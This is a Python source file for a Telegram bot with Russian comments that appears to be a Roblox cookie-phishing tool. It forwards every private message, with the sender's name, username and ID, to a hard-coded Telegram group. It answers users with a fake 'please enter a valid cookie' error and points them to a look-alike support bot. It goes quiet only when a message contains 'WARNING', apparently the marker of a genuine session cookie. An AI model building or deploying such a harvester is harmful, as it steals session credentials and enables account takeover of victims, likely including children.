import os
import telebot
from flask import Flask, request, jsonify
import logging
import time
import threading

# ============= НАСТРОЙКА =============
TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN')
GROUP_ID = os.environ.get('TELEGRAM_GROUP_ID', '-1003396901780')

bot = telebot.TeleBot(TOKEN)
app = Flask(__name__)

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# ============= ОБРАБОТЧИКИ =============
@bot.message_handler(commands=['start'])
def start_command(message):
    logger.info(f"🔥 ПОЛУЧЕН /start от {message.from_user.id}")
    
    # ПРОСТОЙ ТЕСТ - отправляем только пользователю
    bot.send_message(
        message.chat.id,
        "✅ ТЕСТ: Бот получил ваш /start!"
    )
    
    # Пытаемся отправить в группу (логируем ошибку если будет)
    try:
        bot.send_message(
            GROUP_ID,
            f"👤 Тестовый /start от {message.from_user.id}"
        )
        logger.info(f"✅ Отправлено в группу {GROUP_ID}")
    except Exception as e:
        logger.error(f"❌ Ошибка отправки в группу: {e}")

@bot.message_handler(func=lambda message: True)
def handle_all_messages(message):
    if message.chat.type != 'private':
        return
    
    logger.info(f"📩 Сообщение от {message.from_user.id}: {message.text[:30]}")
    
    # В ГРУППУ
    try:
        username = f"@{message.from_user.username}" if message.from_user.username else "без юзернейма"
        bot.send_message(
            GROUP_ID,
            f"📩 Сообщение от: {message.from_user.first_name}\n"
            f"Юзернейм: {username}\n"
            f"ID: {message.from_user.id}\n"
            f"Текст: {message.text}"
        )
    except Exception as e:
        logger.error(f"❌ Ошибка группы: {e}")
    
    if "WARNING" in message.text:
        logger.info("🔇 Игнорировано (WARNING)")
        return
    
    bot.send_message(
        message.chat.id,
        "ошибка❌ пожалуйста, введите действительный куки! если не знаете как его получить обращайтесь в поддержку - @suportrrobloxbot"
    )

# ============= ВЕБХУКИ =============
@app.route('/')
def index():
    return jsonify({
        "status": "Бот работает!",
        "bot": bot.get_me().username if TOKEN else "Нет токена",
        "url": "https://my-telegram-bot-17u4.onrender.com"
    }), 200

@app.route('/webhook', methods=['POST'])
def webhook():
    """ПРИНИМАЕМ СООБЩЕНИЯ ОТ TELEGRAM"""
    try:
        if request.headers.get('content-type') == 'application/json':
            json_string = request.get_data().decode('utf-8')
            
            # 🔥 ВАЖНО: ЛОГИРУЕМ ЧТО ПРИШЛО
            logger.info(f"📡 WEBHOOK получен: {json_string[:150]}...")
            
            update = telebot.types.Update.de_json(json_string)
            
            # Обрабатываем в отдельном потоке
            def process_update():
                try:
                    bot.process_new_updates([update])
                    logger.info("✅ Сообщение обработано")
                except Exception as e:
                    logger.error(f"💥 Ошибка обработки: {e}")
            
            thread = threading.Thread(target=process_update)
            thread.start()
            
            return 'OK', 200
    except Exception as e:
        logger.error(f"💥 Ошибка webhook: {e}")
    return 'Bad Request', 400

@app.route('/set_webhook', methods=['GET'])
def set_webhook():
    webhook_url = os.environ.get('RENDER_EXTERNAL_URL', '')
    if not webhook_url:
        webhook_url = request.host_url.rstrip('/')
    
    webhook_url = f"{webhook_url}/webhook"
    
    try:
        bot.remove_webhook()
        time.sleep(1)
        result = bot.set_webhook(url=webhook_url)
        
        if result:
            return jsonify({
                "success": True,
                "message": f"Вебхук: {webhook_url}",
                "bot": bot.get_me().username
            }), 200
        else:
            return jsonify({"success": False, "message": "Ошибка"}), 500
    except Exception as e:
        return jsonify({"success": False, "message": str(e)}), 500

@app.route('/health')
def health_check():
    return jsonify({"status": "ok"}), 200

# ============= ЗАПУСК =============
if __name__ == '__main__':
    print("🚀 Локальный запуск...")
    bot.remove_webhook()
    bot.polling(none_stop=True)
else:
    logger.info("✅ Бот готов на Render!")
